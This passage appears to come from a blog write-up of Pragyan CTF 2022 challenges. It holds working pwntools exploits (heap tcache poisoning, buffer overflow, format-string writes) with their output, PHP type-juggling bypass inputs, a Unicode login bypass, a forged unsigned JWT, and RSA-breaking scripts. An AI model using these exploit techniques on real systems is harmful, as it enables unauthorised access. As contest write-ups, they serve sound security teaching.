=\u003e ', str(index).encode()) def leave(r): r.sendlineafter(b'choice =\u003e ', str(5).encode()) log.info(r.readrepeat(1)) elf = ELF('database') main_addr = elf.symbols['main'] r = remote('binary.challs.pragyanctf.tech', 6004) r.recvuntil(b'This might help: ') leaked_main = int(r.recvline().strip(), 16) elf.address = leaked_main - main_addr secret_addr = elf.symbols['secret'] puts_got = elf.got['puts'] log.info(f'Leaked main: {hex(leaked_main)}') log.info(f'Base addr : {hex(elf.address)}') log.info(f'Secret addr: {hex(secret_addr)}') log.info(f'Puts got : {hex(puts_got)}') insert_item(r, 16, b'a'*16) insert_item(r, 16, b'a'*16) insert_item(r, 16, b'a'*16) delete_item(r, 2) delete_item(r, 1) update_item(r, 0, 16+8+8+8, b'a'*16+p64(0)+p64(0x21)+p64(puts_got)) insert_item(r, 16, b'a'*16) insert_item(r, 16, p64(secret_addr)) leave(r) [x] Opening connection to binary.challs.pragyanctf.tech on port 6004 [x] Opening connection to binary.challs.pragyanctf.tech on port 6004: Trying 159.203.157.131 [+] Opening connection to binary.challs.pragyanctf.tech on port 6004: Done [*] Leaked main: 0x562483ff3275 [*] Base addr : 0x562483ff2000 [*] Secret addr: 0x562483ff3262 [*] Puts got : 0x5624841f3cd0 [*] p_ctf{Ch4Ng3_1T_t0_M4x1Mum} Flag: p_ctf{Ch4Ng3_1T_t0_M4x1Mum} ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:1:3","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Poly-Flow ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:2:0","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Intro We were given a binary, let’s decompile it. Below is the main function undefined4 main(void) { int iVar1; undefined local_21 [16]; undefined local_11; undefined *local_10; local_10 = \u0026stack0x00000004; printf(\"Enter the passphrase: \"); fflush((FILE *)stdout); __isoc99_scanf(\u0026DAT_080d403c,local_21); local_11 = 0; iVar1 = check(local_21); if (iVar1 == 0) { puts(\"Incorrect.\"); } else { input(); } return 0; } Check function undefined4 check(char *param_1) { size_t sVar1; undefined4 uVar2; int local_14; int local_10; sVar1 = strlen(param_1); if (sVar1 == 0x10) { local_10 = 0; for (local_14 = 0; local_14 \u003c 4; local_14 = local_14 + 1) { local_10 = local_10 + *(int *)(param_1 + local_14 * 4); } if (local_10 == L'\\xdeadbeef') { uVar2 = 1; } else { uVar2 = 0; } } else { uVar2 = 0; } return uVar2; } input function void input(void) { char local_1c [20]; if (i.0 == 5) { puts(\"Here is your flag.\"); system(\"cat flag\"); puts(\"\"); } i.0 = i.0 + 1; fgets(local_1c,0x24,(FILE *)stdin); return; } ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:2:1","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Analysis Okay, so the flow is: Need to pass check function, where we need to pass a string, where if it get splitted into 4 chunks where a chunk consist of 4 bytes, the sum of the 4 chunks is 0xdeadbeef. After that we will go to input method. Notice that there is a buffer overflow, where we can replace the return value of input ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:2:2","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Solution So, below is the solver script, where we simply: Pass a string that the 4 chunks sum is 0xdeadbeef And then with BOF, we can ret to the input 5 times, so that the binary will cat the flag. from pwn import * from pwn import p64, u64, p32 context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") elf = ELF('./Poly-flow') input_addr = elf.symbols['input'] r = remote('binary.challs.pragyanctf.tech', 6002) r.sendafter(b'passphrase: ', p32(0x37ab6fbb)*3+p32(0x37ab6fbb+3)) # deadbeef r.send(b'a'*0x1c + p32(input_addr) + b'a'*0x4) r.send(b'a'*0x1b + p32(input_addr) + b'a'*0x4) # one-byte adjustment based on observation in GDB r.send(b'a'*0x1b + p32(input_addr) + b'a'*0x4) # one-byte adjustment based on observation in GDB r.send(b'a'*0x1b + p32(input_addr) + b'a'*0x4) # one-byte adjustment based on observation in GDB r.send(b'a'*0x1b + p32(input_addr) + b'a'*0x4) # one-byte adjustment based on observation in GDB r.interactive() Flag: p_ctf{mUlT1Pl3_BuFf3R_Ov3rF|0w} ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:2:3","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Portal ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:3:0","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Intro We were given a binary. Below is the main decompiled: undefined8 main(void) { long in_FS_OFFSET; int local_14; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); local_14 = 0; initialize(); puts(\"Welcome!\"); do { putchar(10); puts(\"What would you like to do?\"); puts(\"1) Check Balance\"); puts(\"2) Upgrade Pack\"); __isoc99_scanf(\u0026DAT_0010218f,\u0026local_14); getchar(); fflush(stdin); if (local_14 == 1) { see_balance(); } else if (local_14 == 2) { init_pack(); } else { if (local_14 != 3) { puts(\"Invalid \"); if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; } check = 1; see_profile(); check = 0; } puts(\"Bye!\"); } while( true ); } see_balance: void see_balance(void) { long in_FS_OFFSET; char local_78 [104]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); printf(\"You currently have Rs.%d left!\\n\",(ulong)b); puts(\"Wanna upgrade pack?\"); fgets(local_78,100,stdin); printf(local_78); if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; } init_pack: void init_pack(void) { if (b == 0xf9) { upgrade_pack(); } else { puts(\"You do not have enough balance :(\"); } return; } upgrade_pack undefined8 upgrade_pack(void) { FILE *__stream; char *__s; long in_FS_OFFSET; char local_98 [136]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); __stream = fopen(\"flag_maybe\",\"r\"); if (__stream == (FILE *)0x0) { puts(\"Flag not found.\"); /* WARNING: Subroutine does not return */ exit(1); } fgets(local_98,0x80,__stream); fclose(__stream); puts(\"Upgrading PAcK\"); __s = (char *)malloc(0x12d); puts(\"Enter coupon code:\"); fgets(__s,300,stdin); puts(\"Upgrading pack with the coupon:\"); printf(__s); check = 1; see_profile(); if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; } ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:3:1","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Analysis Reading through the decompiled code, some notes that we could take: Reading through the see_balance method, we notice bug where format string attack is applicable. In order to call upgrade_pack method, in the init_pack method, we need to make the global variable of b value to 0xf9. Reading through the upgrade_pack method, we notice bug where format string attack is applicable. Flag was stored in the upgrade_pack method stack. Let’s do checksec to check further mitigation on the binary. Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Okay so the PIE is enabled, which mean we might need to leak the binary base address first. ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:3:2","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Solution Based on those notes, my idea to solve this is: With the format string bug on see_balance, I will try to leak the main address, so that I can retrieve the binary base address After that, with the same bug, I will overwrite the value b with 0xf9, so that I can go to the upgrade_pack method. With the format string bug on upgrade_pack method, because the flag was stored in the stack, I can simply leak the flag. Below is the full script of that from pwn import * from pwn import p64, u64, p32, u32 context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") elf = ELF('./load') r = remote('binary.challs.pragyanctf.tech', 6003) # Leaked main r.sendlineafter(b'Pack\\n', str(1).encode()) fmt_str = b'a'*8 + b'.%19$p.%20$p.%21$p' # the 21th is the main+164 address value r.sendlineafter(b'pack?\\n', fmt_str) out = r.recvline().strip().split(b'.') leaked_main = int(out[-1], 16) elf.address = leaked_main - elf.symbols['main'] - 164 b_addr = elf.symbols[\"b\"] log.info(f'Leaked main: {hex(leaked_main)}') log.info(f'Elf address: {hex(elf.address)}') log.info(f'b address : {hex(b_addr)}') # val = 0xf9 fmt_str = b'%249c%8$naaaaaaa'+p64(b_addr) # 8th index is our p64(b_addr) value, which mean we will write 249 (0xf9) to b variable. log.info(fmt_str) r.sendlineafter(b'Pack\\n', str(1).encode()) r.sendlineafter(b'pack?\\n', fmt_str) r.sendlineafter(b'Pack\\n', str(2).encode()) r.sendlineafter(b'coupon code:\\n', b'%8$p %9$p %10$p %11$p') # Flag was stored in 8th-11th index r.recvline() out = r.recvline().strip().split(b' ')[-4:] flag = b'' for f in out: flag += p64(int(f, 16)) log.info(f'Flag: {flag}') Flag: p_ctf{W3ll_1t_W4s_3aSy_0n1y} Web ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:3:3","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"PHP Train We were given a website with the below source code \u003c?php show_source(\"index.php\"); include 'constants.php'; error_reporting(0); if(isset($_GET[\"param1\"])) { if(!strcmp($_GET[\"param1\"], CONSTANT1)) { echo FLAG1; } } if(isset($_GET[\"param2\"]) \u0026\u0026 isset($_GET[\"param3\"])) { $str2 = $_GET[\"param2\"]; $str3 = $_GET[\"param3\"]; if(($str2 !== $str3) \u0026\u0026 (sha1($str2) === sha1($str3))) { echo FLAG2; } } if(isset($_GET[\"param4\"])) { $str4 = $_GET[\"param4\"]; $str4=trim($str4); if($str4 == '1.2e3' \u0026\u0026 $str4 !== '1.2e3') { echo FLAG3; } } if(isset($_GET[\"param5\"])) { $str5 = $_GET[\"param5\"]; if($str5 == 89 \u0026\u0026 $str5 !== '89' \u0026\u0026 $str5 !== 89 \u0026\u0026 strlen(trim($str5)) == 2) { echo FLAG4; } } if(isset($_GET[\"param6\"])) { $str6 = $_GET[\"param6\"]; if(hash('md4', $str6) == 0) { echo FLAG5; } } if(isset($_GET[\"param7\"])) { $str7 = $_GET[\"param7\"]; $var1 = 'helloworld'; $var2 = preg_replace(\"/$var1/\", '', $str7); if($var1 === $var2) { echo FLAG6; } } if(isset($_GET[\"param8\"])) { $str8 = $_GET[\"param8\"]; $comp = range(1, 25); if(in_array($str8, $comp)) { if(preg_match(\"/\\.env/\", $str8)) { echo FLAG7; } } } ?\u003e So we need to bypass all this check to retrieve the full flag. ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:4:0","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Flag 1 To bypass strcmp, we can simply pass param1[]=a. We got p_ctf{ech0_. ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:4:1","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Flag 2 To bypass sha1 collision, we can simply pass array to both params (param2[]=a\u0026param3[]=b). We got 1f_7h3_7r41n_. ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:4:2","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Flag 3 We just need to pass param4=1200 becaue 1.2e3 is equals to 1200. We got d035_n07_. ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:4:3","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Flag 4 We just need to pass param5=89%20 because the value checking is using loose comparison, so the whitespace will be discarded. We got 5t0p_1n_y0ur_. ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:4:4","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Flag 5 We just need to pass magic hash as param6=gH0nAdHk, where the hash result prefix is 0e because of the loose comparison. We got 5t4t10n_7h3n_. ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:4:5","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Flag 6 We just need to pass param7=hellohelloworldworld, so that after the preg_replace, the param7 value will be helloworld. We got 1t5_n07_. ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:4:6","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Flag 7 We just need to pass param8=1.env because in_array use loose comparison, so as long as our first string start with 1, in_array will return true. We got y0ur_7r41n}. Flag: p_ctf{ech0_1f_7h3_7r41n_d035_n07_5t0p_1n_y0ur_5t4t10n_7h3n_1t5_n07_y0ur_7r41n} ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:4:7","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Inception We were given a website. Checking the source code, we got obfuscated javascript. Now, we just need to examine properly the obfuscated. The first part is this code var _0xa965=[\"\\x65\\x6E\\x74\\x72\\x69\\x65\\x73\",\"\",\"\\x62\",\"\\x61\",\"\\x74\\x6F\",\"\\x6E\\x61\\x6D\\x65\",\"\\x61\\x6C\\x6C\",\"\\x66\\x69\\x6C\\x6C\",\"\\x4D\\x49\\x4E\\x5F\\x56\\x41\\x4C\\x55\\x45\"];(function(){var _0x31e3x1=()=\u003e{ var _0x31e3x2=[][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]][([][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]] + [])[!+[]+ !+[] + !+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + ([][[]]+ [])[+!+[]] + (![]+ [])[!+[]+ !+[] + !+[]] + (!![]+ [])[+[]] + (!![]+ [])[+!+[]] + ([][[]]+ [])[+[]] + ([][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]] + [])[!+[]+ !+[] + !+[]] + (!![]+ [])[+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + (!![]+ [])[+!+[]]]((!![]+ [])[+!+[]] + (!![]+ [])[!+[]+ !+[] + !+[]] + (!![]+ [])[+[]] + ([][[]]+ [])[+[]] + (!![]+ [])[+!+[]] + ([][[]]+ [])[+!+[]] + (+[![]]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+!+[]]] + (!![]+ [])[!+[]+ !+[] + !+[]] + (+(!+[]+ !+[] + !+[] + [+!+[]]))[(!![]+ [])[+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + ([]+ [])[([][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]] + [])[!+[]+ !+[] + !+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + ([][[]]+ [])[+!+[]] + (![]+ [])[!+[]+ !+[] + !+[]] + (!![]+ [])[+[]] + (!![]+ [])[+!+[]] + ([][[]]+ [])[+[]] + ([][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]] + [])[!+[]+ !+[] + !+[]] + (!![]+ [])[+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + (!![]+ [])[+!+[]]][([][[]]+ [])[+!+[]] + (![]+ [])[+!+[]] + ((+[])[([][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]] + [])[!+[]+ !+[] + !+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + ([][[]]+ [])[+!+[]] + (![]+ [])[!+[]+ !+[] + !+[]] + (!![]+ [])[+[]] + (!![]+ [])[+!+[]] + ([][[]]+ [])[+[]] + ([][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]] + [])[!+[]+ !+[] + !+[]] + (!![]+ [])[+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + (!![]+ [])[+!+[]]] + [])[+!+[]+ [+!+[]]] + (!![]+ [])[!+[]+ !+[] + !+[]]]](!+[]+ !+[] + !+[] + [!+[]+ !+[]]) + (![]+ [])[+!+[]] + (![]+ [])[!+[]+ !+[]])()([][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]][([][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]] + [])[!+[]+ !+[] + !+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + ([][[]]+ [])[+!+[]] + (![]+ [])[!+[]+ !+[] + !+[]] + (!![]+ [])[+[]] + (!![]+ [])[+!+[]] + ([][[]]+ [])[+[]] + ([][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]] + [])[!+[]+ !+[] + !+[]] + (!![]+ [])[+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + (!![]+ [])[+!+[]]]((!![]+ [])[+!+[]] + (!![]+ [])[!+[]+ !+[] + !+[]] + (!![]+ [])[+[]] + ([][[]]+ [])[+[]] + (!![]+ [])[+!+[]] + ([][[]]+ [])[+!+[]] + ([]+ [])[(![]+ [])[+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + ([][[]]+ [])[+!+[]] + (!![]+ [])[+[]] + ([][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]] + [])[!+[]+ !+[] + !+[]] + (!![]+ [][(![]+ [])[+[]] + (![]+ [])[!+[]+ !+[]] + (![]+ [])[+!+[]] + (!![]+ [])[+[]]])[+!+[]+ [+[]]] + (![]+ [])[!+[]+ !+[]] + (!![]+ [][","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:5:0","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Code of Chaos We were given a website, where we need to bypass the login page. Checking the robots.txt, we found the source code of the website. require 'sinatra/base' require 'sinatra' require \"sinatra/cookies\" get '/' do if request.cookies['auth'] @user = getUsername() # getUsername() - Method to get username from cookies if @user.upcase == \"MICHAEL\" return erb :michael end return erb:index else return erb :index end end post '/login' do user = params['username'].to_s[0..20] password = params['password'].to_s[0..20] if user =~ /[A-Z]/ or user == 'michael' info = \"Invalid Username/Password\" return erb :login, :locals =\u003e {:info =\u003e info} elsif password == \"whatever\" and user.upcase == \"MICHAEL\" set_Cookies(user) else info = \"Invalid Username/Password\" return erb :login, :locals =\u003e {:info =\u003e info} end redirect '/' end Okay, so the requirement is, somehow, we need to login with user michael and pass whatever, but we aren’t allowed to pass michael. And then, the uppercase of our user username should be MICHAEL. How to achieve that? The answer is to use UNICODE. Some unicode will be converted to not-UNICODE during converting it to uppercase. In this case, I use ı unicode, so that the username is mıchael. The upcase result will be MICHAEL, so we can safely login to our website. Okay now we need to get the admin privilege to find the rest of the flag. Checking the cookie, it contains jwt token, which the decrypted result is like below We can try to bypass this by changing the alg to none and change the user value to admin. Generating the forged jwt token, we get the second flag. Forged jwt: eyJ0eXAiOiAiSldTIiwgImFsZyI6ICJub25lIn0.eyJ1c2VyIjogImFkbWluIn0. Flag: p_ctf{un1c0de_4nd_j3t_m4kes_fu7} Crypto ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:6:0","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"One Try We were given a file like below from Crypto.Util.number import long_to_bytes,bytes_to_long from flag import * assert k.bit_length() == 40 def hide(): p=95237125230167487838272944166423714051165223593288401382688685829040590786990768778438234082000903807362777558583037575230881045249425322887376601259055892460702772000162982010970208724929645212521533513649369206757681770172577467721506667626730799406015091008310940052579697065207083389866466950134622798087 q=124379800279519757231453952571634329234726580565504345524807447690769923505626825913853213968267033307369831541137813374478821479720151365039955869403139958659415082657593784893960018420207872886098820339882222586464425407525431977262528398209506069668083100281117639890041468740215875574081639292225496987247 return pow(bytes_to_long(flag.encode()),k,p*q) def pad(a): if len(a) % 32 != 0: a = ((32-len(a) % 32)*chr(0).encode()) + a return a def encrypt(a, key=k): ct = [i for i in (pad(long_to_bytes(a)))] keys=long_to_bytes(key) for x in range(5): for i in range(32): ct[i]=ct[i]^keys[0] for j in range(len(keys)): ct[i] = (ct[i] ^ keys[j] if i \u0026 2**j != 0 else ct[i]) keys = keys[1:] return ct #print(hide()) #9803360482107840935986732378323704110929708112302712803731012575465683179961905078466611828488789490543493731143558620545390953556032902554822421856356533539501430684361482576102587663520949056746659748698357755897924885992782747151219465028805502494393787119343428804346092071091528754744212809617351149272272380807238804504647510591726329582179077324427249076164587445605982981728078911123292553075494650141966258672901488344682939222675606336207847496023541310374013054536034137315183694024407951884904209160042408478973616348037614424915600220818790089801126821003600059671390406058169258661700548713247796139155 #print(encrypt(69837538996696154134353592503427759134303178119205313290251367614441787869767)) #[153, 102, 39, 242, 39, 149, 117, 232, 221, 111, 183, 6, 70, 46, 4, 222, 85, 178, 233, 81, 4, 186, 240, 74, 238, 81, 27, 83, 14, 154, 143, 1] Reading through the file, we know that we need to know the public exponent value of the RSA Encryption (which is k). We can derive it from the encrypt method. Reading through it, we can simply solve it with z3 to retrieve our k. After getting the k, we can simply do RSA decryption to retrieve the flag. I use sagemath to solve it. from z3 import * from Crypto.Util.number import long_to_bytes,bytes_to_long cipher = 9803360482107840935986732378323704110929708112302712803731012575465683179961905078466611828488789490543493731143558620545390953556032902554822421856356533539501430684361482576102587663520949056746659748698357755897924885992782747151219465028805502494393787119343428804346092071091528754744212809617351149272272380807238804504647510591726329582179077324427249076164587445605982981728078911123292553075494650141966258672901488344682939222675606336207847496023541310374013054536034137315183694024407951884904209160042408478973616348037614424915600220818790089801126821003600059671390406058169258661700548713247796139155 p = 95237125230167487838272944166423714051165223593288401382688685829040590786990768778438234082000903807362777558583037575230881045249425322887376601259055892460702772000162982010970208724929645212521533513649369206757681770172577467721506667626730799406015091008310940052579697065207083389866466950134622798087 q = 124379800279519757231453952571634329234726580565504345524807447690769923505626825913853213968267033307369831541137813374478821479720151365039955869403139958659415082657593784893960018420207872886098820339882222586464425407525431977262528398209506069668083100281117639890041468740215875574081639292225496987247 n = p*q def pad(a): if len(a) % 32 != 0: a = ((32-len(a) % 32)*chr(0).encode()) + a return a aa = BitVec(\"aa\", 8) b = BitVec(\"b\", 8) c = BitVec(\"c\", 8) d = BitVec(\"d\", 8) e = BitVec(\"e\", 8) a = 69837538996696154134353592503427759134303178119205313290251367614441787869767 res = [153, 102, 39, 242, 39","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:7:0","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Blind Scout We were given base64 of encrypted text, and 5 pem file. I try to check whether there is common factor between the modulus of each file, and I found a common modulus between the second and the fourth pem, which mean now we can factor the second and the fourth pem. Trying to decrypt the encrypted with the second pem gave me the result. sage: n_arr = [101624963561615795807663999026679788748815571421569462807927860956728888493496000977417890670717889501659207162509309001973634584813285 ....: 342662515006961794389212761798054369199413737251594682052270204212522489108642197112766627721236631574948182620021172433826492285874433680636116 ....: 813877578486396232272605937561, 1011616617510531186379147101997466731485620478711403355091755786287415666522860447862499110392145759510656666591 ....: 470242416519048039892002751007637404549414518731218298102241824341344268742743948423404434709057414369822440704279068689361239474954277506897937 ....: 87251736335878699753312245001791230360774169153125961, 95526787053419014109054725109743370408304260719719585954706005684413321609913217550727024 ....: 245842583031598086600304887433115914852617240935445485427407699442096748854890978725921696692177567320558635896629488221767729803968358687622408 ....: 630160337012535746823742288778463891730458119068421721485754533986448559521, 1392298901743569283830885491292450369489388067227114648628412229866 ....: 087851506138834981673061940930326777192231195720059963067126884964384173164941643023918419515241929067350793936588931936577031156295691633910531 ....: 29315864720324029971949625294486467313990931665248372153504002783908891387654449725452212287159201, 22757826149764684743463933021927715182500340 ....: 484111227818579368360240839107126711849522664234633613754664100700942438561118214061073557590806391491871814598185848108761608510852179612557240 ....: 139333852547118051755659499478661739234908902510957853009340542872322052976036210119239981021264970596897721054414227247] sage: for a in n_arr: ....: for b in n_arr: ....: if a != b and gcd(a,b) \u003e 1: ....: print(a, b, gcd(a, b)) ....: break ....: 101161661751053118637914710199746673148562047871140335509175578628741566652286044786249911039214575951065666659147024241651904803989200275100763740454941451873121829810224182434134426874274394842340443470905741436982244070427906868936123947495427750689793787251736335878699753312245001791230360774169153125961 139229890174356928383088549129245036948938806722711464862841222986608785150613883498167306194093032677719223119572005996306712688496438417316494164302391841951524192906735079393658893193657703115629569163391053129315864720324029971949625294486467313990931665248372153504002783908891387654449725452212287159201 11404558015123108856751187513905109381282387160753409607670595499554019241036182740264653756082739068977207604410155939806146572246665811506938573782182379 139229890174356928383088549129245036948938806722711464862841222986608785150613883498167306194093032677719223119572005996306712688496438417316494164302391841951524192906735079393658893193657703115629569163391053129315864720324029971949625294486467313990931665248372153504002783908891387654449725452212287159201 101161661751053118637914710199746673148562047871140335509175578628741566652286044786249911039214575951065666659147024241651904803989200275100763740454941451873121829810224182434134426874274394842340443470905741436982244070427906868936123947495427750689793787251736335878699753312245001791230360774169153125961 11404558015123108856751187513905109381282387160753409607670595499554019241036182740264653756082739068977207604410155939806146572246665811506938573782182379 sage: import base64 sage: c = base64.b64decode('Z9jO5jqN9+fKNYJ14xA3QV96x4AlIIjOwoGSSq2D0G6ddMnKipNJkS2n0IS3blQAMym5dnzKC5MIetKikgozmzruuKDn2Xbkdv529Na2MXizJEMTxP/ioYzUFl ....: 2rJfg7xvyrNxEyPRWoJievmjpnum2pkrWAknAb+6Hj0Qv5yIo=') sage: from Crypto.Util.number import * sage: c = bytes_to_long(c) sage: e = 65537 sage: n = 101161661751053","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:8:0","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Oak We were given a file Oak.class. We can decompile it and it will give us this result // // Decompiled by Procyon v0.5.36 // public class Oak { static long[] data; public static int t_helper(final int n, final int[] array) { if (array[n] != -1) { return array[n]; } if (n == 0) { return array[0] = 0; } if (n == 1) { return array[1] = 1; } if (n == 2) { return array[2] = 3; } return array[n] = 3 * t_helper(n - 1, array) - 3 * t_helper(n - 2, array) + 